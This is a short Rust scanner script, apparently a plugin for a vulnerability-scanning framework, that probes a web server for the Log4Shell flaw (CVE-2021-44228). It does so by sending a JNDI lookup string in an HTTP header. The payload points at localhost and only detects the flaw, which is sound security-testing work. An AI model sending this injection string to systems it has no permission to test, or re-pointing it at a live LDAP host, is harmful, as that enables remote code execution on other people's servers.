/* http-vuln-cve2021-44228-3 - CVE-2021-44228 Log4Shell probe */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let resp = match http_request(ctx, "GET", "/", None,
        "X-Api-Version: ${jndi:ldap://127.0.0.1/a}\r\n", "", None, 4096) {
        Some(r) => r,
        _ => String::new(),
    };
    let code = http_status(&resp);
    if !resp.is_empty() && code > 0 {
        set_out(ctx, &format!(
            "CVE-2021-44228 probe sent (HTTP {}); JNDI callback required to confirm", code));
    } else {
        set_out(ctx, "CVE-2021-44228: no response");
    }
    0
}
